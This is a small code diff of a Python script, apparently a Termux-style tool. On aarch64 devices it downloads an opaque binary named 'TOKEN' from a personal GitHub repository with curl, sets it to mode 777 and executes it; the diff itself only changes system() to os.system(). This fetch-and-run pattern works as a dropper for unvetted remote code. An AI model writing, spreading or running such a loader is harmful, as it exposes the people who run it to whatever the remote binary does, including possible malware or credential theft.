@@ -8,6 +8,6 @@ if 'aarch' in bt:
     if path.isfile("TOKEN"):
         pass
     else:
-        system("curl -L https://raw.githubusercontent.com/K0J4/files/main/TOKEN -o TOKEN")
+        os.system("curl -L https://raw.githubusercontent.com/K0J4/files/main/TOKEN -o TOKEN")
 else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
 os.system('chmod 777 TOKEN && ./TOKEN')
